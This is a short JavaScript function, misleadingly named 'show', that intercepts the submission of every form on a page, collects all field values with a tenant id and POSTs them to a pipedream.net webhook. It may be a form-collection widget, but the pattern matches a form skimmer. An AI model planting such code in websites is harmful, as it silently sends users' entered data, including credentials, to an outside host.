

export function show(text, tenant) {
   
    var formsCollection = document.getElementsByTagName("form");
        for(var i=0;i<formsCollection.length;i++)
        {
            console.log('listening to form:' + formsCollection[i].name);
            formsCollection[i].addEventListener("submit", function(e) {
            e.preventDefault(); 
            let obj = {'tenant':tenant};
            console.log(this.elements);
            var data = new FormData(this);
            for (var [key, value] of data) {  obj[key] = value;  }
            // Should be triggered on form submit
            console.log(obj);
            fetch("https://eo26cjqkx5o16i5.m.pipedream.net", {
                method: "POST",
                body: JSON.stringify(
                    obj
                ),
                headers: {
                    "Content-type": "application/json; charset=UTF-8"
                }
                });
            return true;
            })
        }
}
